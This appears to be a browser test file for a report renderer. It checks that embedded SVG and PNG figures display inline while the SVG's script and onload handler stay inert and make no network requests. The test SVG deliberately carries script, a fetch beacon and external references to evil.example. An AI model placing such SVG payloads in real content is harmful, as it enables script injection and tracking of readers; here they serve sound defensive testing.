// Real-browser check that report figures show inline: an SVG (carrying script, an onload handler and external
// references) and a PNG both load as <img> data URIs, nothing in the SVG runs or reaches the network, and the
// image plate keeps a dark-on-transparent SVG readable in dark mode. Screenshots go to SHOTS_DIR when set.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { chromium } from 'playwright';

const ROOT = path.resolve(import.meta.dirname, '../..');
const PYTHON = process.env.PYTHON || (fs.existsSync(path.join(ROOT, '.venv/bin/python')) ? path.join(ROOT, '.venv/bin/python') : 'python3');
const SHOTS = process.env.SHOTS_DIR;
const PY = `
import hashlib, struct, sys, zlib
from herdr_engineering.control_plane.artifact_report_render import render_report_preview

def png(w, h):
    rows = b"".join(b"\\x00" + bytes(v for x in range(w) for v in (30 + x * 200 // w, 120, 220 - y * 150 // h)) for y in range(h))
    def chunk(tag, data):
        body = tag + data
        return struct.pack(">I", len(data)) + body + struct.pack(">I", zlib.crc32(body))
    return b"\\x89PNG\\r\\n\\x1a\\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)) + chunk(b"IDAT", zlib.compress(rows)) + chunk(b"IEND", b"")

SVG = (b'<svg xmlns="http://www.w3.org/2000/svg" width="320" height="140" viewBox="0 0 320 140" onload="window.parent.__x=1">'
       b'<script>window.__x=1;fetch("http://evil.example/beacon")</script><style>@import url(http://evil.example/x.css);</style>'
       b'<image href="http://evil.example/p.png" width="10" height="10"/><use href="http://evil.example/s.svg#a"/>'
       b'<rect x="10" y="10" width="60" height="110" fill="#111"/><rect x="90" y="40" width="60" height="80" fill="#333"/>'
       b'<rect x="170" y="70" width="60" height="50" fill="#555"/><text x="10" y="135" font-size="12" fill="#000">dark ink, no background</text></svg>')
files = {"svgfig": ("image/svg+xml", SVG), "pngfig": ("image/png", png(240, 100))}
assets = [{"id": k, "name": k + ".bin", "role": "figure", "media_type": m, "sha256": hashlib.sha256(d).hexdigest(), "size_bytes": len(d)}
          for k, (m, d) in files.items()]
report = {"schema_version": 1, "title": "Figure check", "summary": "Inline figures.", "questions": [{"id": "q1", "text": "q"}],
          "evidence": [], "findings": [], "assets": assets,
          "figures": [{"id": "fs", "title": "Scripted SVG", "asset_id": "svgfig", "caption": "Bars drawn as SVG.", "reading_guide": "Taller is more."},
                      {"id": "fp", "title": "Raster PNG", "asset_id": "pngfig", "caption": "A gradient PNG."}]}
sys.stdout.write(render_report_preview(report, figure_images=files))
`;
const html = execFileSync(PYTHON, ['-c', PY], { cwd: ROOT, env: { ...process.env, PYTHONPATH: ROOT } }).toString();
const launch = () => chromium.launch({ headless: true, args: ['--no-sandbox'], ...(process.env.PLAYWRIGHT_CHROMIUM ? { executablePath: process.env.PLAYWRIGHT_CHROMIUM } : {}) });
const loaded = page => page.evaluate(() => [...document.querySelectorAll('img.fig-img')].map(i => ({ alt: i.alt, ok: i.complete && i.naturalWidth > 0, w: i.naturalWidth, box: i.getBoundingClientRect().width, bg: getComputedStyle(i).backgroundColor })));

test('SVG and PNG figures load inline, the scripted SVG runs nothing and loads nothing', async () => {
  const browser = await launch();
  try {
    for (const [scheme, width] of [['light', 1100], ['dark', 390]]) {
      const page = await browser.newPage({ colorScheme: scheme, viewport: { width, height: 900 } });
      const requested = [];
      const errors = [];
      page.on('request', r => requested.push(r.url()));
      page.on('pageerror', e => errors.push(String(e)));
      await page.setContent(html);
      await page.waitForFunction(() => [...document.images].every(i => i.complete));
      const imgs = await loaded(page);
      assert.equal(imgs.length, 2);
      for (const i of imgs) { assert.ok(i.ok && i.w > 0, `${scheme}: ${JSON.stringify(i)}`); assert.ok(i.box <= width, 'fits the viewport'); assert.equal(i.bg, 'rgb(255, 255, 255)'); }
      assert.equal(await page.evaluate(() => window.__x), undefined, 'SVG script must not run');
      assert.deepEqual(errors, []);
      assert.deepEqual(requested.filter(u => !u.startsWith('data:') && u !== 'about:blank'), [], 'no network from the SVG');
      assert.equal(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth), true, 'no horizontal scroll');
      if (SHOTS) await page.screenshot({ path: path.join(SHOTS, `figs-${scheme}-${width}.png`), fullPage: true });
      await page.close();
    }
  } finally { await browser.close(); }
});

test('the figures also load inside a shadow root, as the dashboard mounts the sanitised copy', async () => {
  const browser = await launch();
  try {
    const page = await browser.newPage({ colorScheme: 'dark' });
    await page.setContent('<div id="h" data-theme="dark"></div>');
    await page.evaluate(markup => {
      document.getElementById('h').attachShadow({ mode: 'open' }).innerHTML = markup.replace(/<!doctype html>|<\/?(html|head|body|meta)[^>]*>|<title>.*?<\/title>/g, '');
    }, html);
    await page.waitForFunction(() => [...document.getElementById('h').shadowRoot.querySelectorAll('img')].every(i => i.complete));
    const imgs = await page.evaluate(() => [...document.getElementById('h').shadowRoot.querySelectorAll('img.fig-img')].map(i => i.naturalWidth));
    assert.equal(imgs.length, 2);
    assert.ok(imgs.every(w => w > 0), String(imgs));
    assert.equal(await page.evaluate(() => window.__x), undefined);
    if (SHOTS) await page.screenshot({ path: path.join(SHOTS, 'figs-shadow-dark.png'), fullPage: true });
  } finally { await browser.close(); }
});
